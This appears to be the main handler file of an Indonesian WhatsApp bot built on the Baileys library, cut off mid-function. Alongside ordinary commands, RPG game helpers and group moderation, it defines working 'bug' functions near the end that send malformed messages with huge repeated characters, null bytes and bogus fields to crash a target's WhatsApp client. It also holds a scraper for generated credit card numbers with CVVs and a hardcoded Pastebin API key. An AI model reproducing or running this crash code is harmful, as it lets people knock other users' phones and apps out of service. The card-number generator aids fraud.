require("./config.js")
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    getAggregateVotesInPollMessage,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    makeInMemoryStore,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys')
const fs = require("fs")
const util = require('util')
const toMs = require('ms')
const os = require('os')
const axios = require("axios")
const crypto = require('crypto')
const canvafy = require("canvafy")
const fsx = require("fs-extra")
const ytdl = require("ytdl-core")
const path = require('path')
const _ = require('lodash')
const { Low, JSONFile } = require('./lib/lowdb')
const yargs = require('yargs/yargs')
const { exec, spawn, execSync } = require("child_process")
const fetch = require("node-fetch")
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const moment = require('moment-timezone')
const captcha = require('@neoxr/captcha');
const PhoneNumber = require('awesome-phonenumber')

const imagenya = JSON.parse(fs.readFileSync('./database/image.json'))
const virgam = fs.readFileSync(`./V5Media/theme/bug.png`)
const { ssweb } = require("./lib/ssweb")
const { sswebDesktop, sswebTablet, sswebPhone } = require('./lib/sswebv2')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require("./lib/uploader")

const { 
getGroupAdmins,
jsonformat, 
generateProfilePicture,
getBuffer,
fetchJson
} = require("./lib/myfunc")

global.db.data = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

module.exports = async (alifatah, m, users, chatUpdate, store) => {
require('./lib/schema')(alifatah, m)
try {
const { users } = m
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

async function downloadMp3(url) {
try {
// jalur sampah
let mp3File = './.npm/'+getRandom('.mp3')
ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
await alifatah.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(mp3File)
})
} catch(e) {
console.log(e)
return alifatah.sendteks(from, util.format(e), m)
}
}

const budy = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
            userJid: alifatah.user.id,
            quoted:fcall.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, alifatah.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        alifatah.ev.emit('messages.upsert', msg)
    }

const { lolkey, aikey } = require('./database/apikey.json')
const botNumber = await alifatah.decodeJid(alifatah.user.id)
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
    const _prem = require("./lib/premium");
    const prem = JSON.parse(fs.readFileSync("./database/premium.json"))
    const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
    let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
    const { searching, spotifydl } = require("./lib/spotify");
    const { maudio, dmusic } = require('./lib/musik.js')
    const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./src/rpg/darah.js')
    const { buttonkal } = require('./V5Media/virtex/buttonkal')
    const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./src/rpg/rpg.js')
    const { cekDuluHasilBuruanNya, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./src/rpg/buruan.js')
    const mark = `0@s.whatsapp.net`
    const alifatahv = fs.readFileSync('./V5Media/theme/alifatah-v.jpg')
    const alifatahv4 = fs.readFileSync('./V5Media/theme/alifatah-v4.jpg')
    const uploadImage = require('./lib/uploadImage')
    const pekdoc = fs.readFileSync('./V5Media/theme/fakedoc.jpg')
    const anon = require('./lib/menfess')
    const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
    const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./lib/register.js')
    const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./lib/deposit");
    let depositPath = "./lib/deposit/"
    const { runtime, fetchJson, getRandom, getTime, tanggal, telegraPh, pinterest, ucapan, clockString, generateProfilePicture, isUrl } = require('./lib/function.js')
    let _petualang = JSON.parse(fs.readFileSync('./src/rpg/inventory.json'))
    
    // SETTING USER RPG
let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'
    
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const sender = m.key.fromMe ? (alifatah.user.id.split(':')[0]+'@s.whatsapp.net' || alifatah.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const tag = `@${m.sender.split('@')[0]}`
const isBot = botNumber.includes(senderNumber)
const fatkuns = (m.quoted || m)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.m || quoted).mimetype || ''
const qmsg = (quoted.m || quoted)
const isRegistered = checkRegisteredUser(m.sender)
const isPremium = prem.includes(sender, premium)
const nomore = m.sender.replace(/[^0-9]/g, '')
const more = String.fromCharCode(8206)
const from = m.key.remoteJid
const readmore = more.repeat(4001)
const groupMetadata = m.isGroup ? await alifatah.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🏙️'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang 🌆'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌇'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🌤️'
}
if(time2 < "10:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Subuh 🌆'
}
if(time2 < "03:00:00"){
var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}

const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('./V5Media/file/textunban.js')

const { bodymenu, testimoni, unbanned, crpanel, ownerlist, dasboard, pambayaran, flamingli, qoutedmen, groupstack, vidrdm, imgrdm, primek, inter, shoppanel, animemen, shopjasa, shopocean } = require('./V5Media/database/message.js')

const { vnToxic, vnSalam, vnBot, vnAra, vnSpam, vnOwner, vnKawai, vnLove } = require('./lib/vn.js')

const ments = (teks) => {return teks.match('@') ? [...teks.matchalifatahl(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

/*const reply = (teks) => {
  alifatah.sendMessage(m.chat, { text: teks }, { quoted:fcall })
}*/
const doc = await fs.readFileSync('./package.json')
const isPetualang = checkPetualangUser(m.sender)

async function reply(txt) {
const FauziAjh = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "",
newsletterJid: "",
},
externalAdReply: {  
showAdAttribution: true,
title: `⚡𝑨𝑳𝑰𝑭𝑨𝑻𝑨𝑯 𝑽6 - 𝒁𝑰𝑻𝑨𝑵`,
body: 'Subscribe My YouTube',
thumbnailUrl: 'https://telegra.ph/file/98f778ee254c4b49ebc23.jpg',
sourceUrl: 'https://www.youtube.com/@Fauzialifatah',
},
},
text: txt,
}
return alifatah.sendMessage(m.chat, FauziAjh, {
quoted:fcall,
})
}

alifatah.autoshalat = alifatah.autoshalat ? alifatah.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? alifatah.user.id : m.sender
	let id = m.chat 
    if(id in alifatah.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Waktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`
    alifatah.autoshalat[id] = [
    alifatah.sendMessage(m.chat, {
                        audio: {
                            url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                        },
                        mimetype: 'audio/mp4',
                        ptt: true,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                mediaType: 1,
                                mediaUrl: '',
                                title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                                body: `🕑 ${waktu}`,
                                sourceUrl: '',
                                thumbnail: await fs.readFileSync('./V5Media/theme/jdw.jpg'),
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m,
                    }),
    setTimeout(async () => {
    delete alifatah.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

if (isCmd) console.log("~>Command", command, "from", pushname, "in", m.isGroup ? "Group Chat" : "Private Chat", '[' + args.length + ']');

const getShortenedUrl = async (url) => {
let { data } = await axios.post("https://shorturl.alifatah.fund", { url });
return data.data.shortUrl;
};

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(3000);
  }
}

const fkontak2 = {key: {fromMe: false, participant: `${sender.split('@')[0]}@s.whatsapp.net`, ...(m.chat ? { remoteJid: '0@s.whatsapp.net' } : {}) }, message: {contactMessage: {displayName: `${pushname}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${pushname}\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

async function loading () {
var arr = [
"□□■■■■■■■■\n             𝟷𝟶٪",
"■■□□■■■■■■\n             𝟹𝟶٪",
"■■■■□□■■■■\n             𝟻𝟶٪",
"■■■■■■□□■■\n             𝟾𝟶٪",
"■■■■■■■■□□\n             𝟷𝟶𝟶٪",
"ʟ ᴏ ᴀ ᴅ ɪ ɴ ɢ  ᴄ ᴏ ᴍ ᴘ ʟ ᴇ ᴛ ᴇ. . ."
]
let load = await alifatah.sendMessage(m.chat, {text: '🕛'},{quoted:fcall})
for (let i = 0; i < arr.length; i++) {
await alifatah.sendMessage(m.chat, {text: arr[i], edit: load.key },{quoted:fcall});
}
}

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

/*
Function Event Message
*/
const SendEventMessage = async (to, a, b, c, d) => {
const { randomBytes } = require('crypto');
let msg = generateWAMessageFromContent(to, {
        messageContextInfo: {
            messageSecret: randomBytes(32)
        },
        eventMessage: {
            isCanceled: false,
            name: a, 
            description: b,
            location: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: c
            },
            joinLink: d,
            startTime: m.messageTimestamp 
        }
    }, {quoted:fcall});

    alifatah.relayMessage(to, msg.message, {
          messageId: msg.key.id,
        },{quoted:fcall})
}

async function GenerateCC(query) {
    try {
        const response = await fetch("https://tools.revesery.com/vcc/revesery.php?bin=" + parseInt(query), {
            method: "GET",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
            }
        });

        if (!response.ok) {
            throw new Error("Gagal mengambil data.");
        }

        const html = await response.text();
        const $ = cheerio.load(html);

        const cards = [];
        $('hr').each((index, element) => {
            const [cardNumber, expirationDate, cvv] = $(element).prevalifatahl('p').map((i, el) => $(el).text().split(': ')[1]);
            cards.push({
                CardNumber: cardNumber,
                ExpirationDate: expirationDate,
                CVV: cvv
            });
        });

        return cards;
    } catch (error) {
        console.error(error);
        throw new Error("Failed to perform the search");
    }
}

const isDarah = cekDuluJoinAdaApaKagaDiJson(m.senpder)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)

if(!isPetualang){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./src/rpg/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
}

function msToTime(duration) {
    const milliseconds = parseInt((duration % 1000) / 100);
    const seconds = Math.floor((duration / 1000) % 60);
    const minutes = Math.floor((duration / (1000 * 60)) % 60);
    const hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

    return `${hours}h ${minutes}m ${seconds}s ${milliseconds}ms`;
}

function formatSize(sizeInBytes) {
    const units = ["B", "KB", "MB", "GB", "TB"];
    let index = 0;

    while (sizeInBytes >= 1024 && index < units.length - 1) {
        sizeInBytes /= 1024;
        index++;
    }

    return sizeInBytes.toFixed(2) + " " + units[index];
}

async function random_mail() {
    const link = "https://dropmail.me/api/graphql/web-test-wgq6m5i?query=mutation%20%7BintroduceSession%20%7Bid%2C%20expiresAt%2C%20addresses%20%7Baddress%7D%7D%7D"

    try {
        let response = await fetch(link);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        let data = await response.json();
        let email = data["data"]["introduceSession"]["addresses"][0]["address"];
        let id_ = data["data"]["introduceSession"]["id"];
        let time = data["data"]["introduceSession"]["expiresAt"];

        return [email, id_, time];

    } catch (error) {
        console.log(error);
    }
}

async function get_mails(id_) {
    const link = `https://dropmail.me/api/graphql/web-test-wgq6m5i?query=query%20(%24id%3A%20ID!)%20%7Bsession(id%3A%24id)%20%7B%20addresses%20%7Baddress%7D%2C%20mails%7BrawSize%2C%20fromAddr%2C%20toAddr%2C%20downloadUrl%2C%20text%2C%20headerSubject%7D%7D%20%7D&variables=%7B%22id%22%3A%22${id_}%22%7D`;

    try {
        let response = await fetch(link);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        let data = await response.json();
        let inbox = data["data"]["session"]["mails"];

        // return the size of the inbox to verify the amount of mail and whether the mail has arrived
        return [inbox, inbox.length];

    } catch (error) {
        console.log(error);
    }
}
const { buttonalifatah } = require("./lib/antibacot.js")
const fake = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
...(m.chat ? { remoteJid: `0@s.whatsapp.net` } : {}),
},
message: {
extendedTextMessage: {
text: `${global.namabot}`,
title: `Hmm`,
thumbnailUrl:"https://telegra.ph/file/e109fb497baf021f23105.jpg",
}}};

try {
var ppuser = await alifatah.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'}
let ppnyauser = await getBuffer(ppuser)
let ppUrl = await alifatah.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let antilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));

const isAntiWame = antiwame.includes(m.chat) ? true : false
const isAntiLinkYoutubeVid = antilinkytvid.includes(m.chat) ? true : false
const isAntiLalifatahl = antilinkall.includes(m.chat) ? true : false

// AntiWame
if (isAntiWame) {
if (budy.match(`wa.me`)) {
if (!isBotAdmins) return reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return reply(`Kamu Owner ku jadi gak masalah`)
await reply(`*「 ANTI WAME 」*\n\nLink Wame Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return reply(`Hehe`)
await alifatah.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await alifatah.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink YT (Vidio)
if (isAntiLinkYoutubeVid) {
if (budy.match(`https://youtu.be/`)) {
if (!isBotAdmins) return reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return reply(`Kamu Owner ku jadi gak masalah`)
await reply(`*「 ANTI LINK YTVID 」*\n\nLink Yt Vid Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return reply(`Hehe`)
await alifatah.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await alifatah.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink alifatahl
if (isAntiLalifatahl) {
if (budy.match(`https://|http//|//`)) {
if (!isBotAdmins) return reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return reply(`Kamu Owner ku jadi gak masalah`)
await (`*「 ANTI LINK ALL 」*\n\nLink alifatahl Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return reply(`Hehe`)
await alifatah.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await alifatah.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

async function createPaste(title = '', content) {
    const data = new URLSearchParams({
        api_dev_key: "_L_ZkBp7K3aZMY7z4ombPIztLxITOOpD",
        api_paste_name: title,
        api_paste_code: content,
        api_paste_format: "text",
        api_paste_expire_date: "N",
        api_option: "paste"
    });

    try {
        const response = await axios.post("https://pastebin.com/api/api_post.php", data, {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        });

        const result = response.data;
        const rawUrl = result.replace(/^(https:\/\/pastebin\.com\/)([a-zA-Z0-9]+)$/, "$1raw/$2");
        if (result) {
            return {
                status: 0,
                original: result,
                raw: rawUrl
            };
        } else {
            return {
                status: 1,
                original: null,
                raw: null
            };
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

const sendvn = (teks) => {
alifatah.sendMessage(m.chat, {audio: {url: teks},ptt: true, waveform: [0,0,50,0,0,0,10,80,10,60,10,99,60,30,10,0,0,0],mimetype: 'audio/mpeg'},{quoted:fcall})		
} 

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${prefix}* ${teks}\n`
}

const ulul = vnBot
const halo = ulul[Math.floor(Math.random() * ulul.length)]

//VN saat ada yang toxic
const anying = vnToxic
const astaga = anying[Math.floor(Math.random() * anying.length)]

//VN saat ada yg akses fitur owner
const ahenggak = vnOwner
const gakmau = ahenggak[Math.floor(Math.random() * ahenggak.length)]

//VN saat ada yg spam
const alal = vnSpam
const nospam = alal[Math.floor(Math.random() * alal.length)]

//VN saat ada yg bilang asalamualaikum
const alul = vnSalam
const walaikumsalam = alul[Math.floor(Math.random() * alul.length)]

//VN saat ada yg bilang i love u
const awlu = vnLove
const lopyoutoo = awlu[Math.floor(Math.random() * awlu.length)]

//VN saat ada yg bilang ara
const ara = vnAra
const wibu = ara[Math.floor(Math.random() * ara.length)]

//VN kawai
const olah = vnKawai
const kawai = olah[Math.floor(Math.random() * olah.length)]

const kol = dmusic
const dstuk = kol[Math.floor(Math.random() * kol.length)]

const moji = ['📚', '💭', '💫', '🌌', '🌏', '〽️', '🌷', '🍁', '🪻',]
const randomemoji = moji[Math.floor(Math.random() * moji.length)]

const totalFitur = () => {
  var mytext = fs.readFileSync("./FauziDev.js").toString();
  var numUpper = (mytext.match(/case '/g) || []).length;
  return numUpper;
};

async function ytmp3(url) {
	try {
		const { videoDetails } = await ytdl.getInfo(url, {
			lang: "id",
		});
		const stream = ytdl(url, {
			filter: "videoandaudio",
		});
		const chunks = [];
		stream.on("data", (chunk) => {
			chunks.push(chunk);
		});
		await new Promise((resolve, reject) => {
			stream.on("end", resolve);
			stream.on("error", reject);
		});
		const buffer = Buffer.concat(chunks);
		return {
			meta: {
				title: videoDetails.title,
				channel: videoDetails.author.name,
				seconds: videoDetails.lengthSeconds,
				description: videoDetails.description,
				image: videoDetails.thumbnails.slice(-1)[0].url,
			},
			buffer: buffer,
			size: buffer.length,
		};
	} catch (error) {
		throw error;
	}
}

let cron = require('node-cron')
        cron.schedule('02 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = 30
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Limit Ke Reset')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })

const onlyGroup = async() => {
reply(`*乂 P R I V A T E - C H A T⛔*

Halo, 👋 @${sender.split('@')[0]}
Fitur tersebut digunakan untuk group`)
}
function isNumber(number) {
if (!number) return number
number = parseInt(number)
return typeof number == 'number' && !isNaN(number)
}


async function berkedok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍ժׁׅ݊ꫀׁׅܻ݊ᥣׁׅ֪tׁׅɑׁׅ•ᝯׁ֒ꭈׁׅɑׁׅׅ꯱hׁׅ֮╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴▴ĐɆⱠ₮₳𝚑ཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await alifatah.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sakittau(target, kuwoted) {
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
}), { userJid: target, quoted: kuwoted });
await alifatah.relayMessage(target, messageContent.message, { participant: { jid: target }, messageId: messageContent.key.id });
}
async function lokasii(target, tytyd) {
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
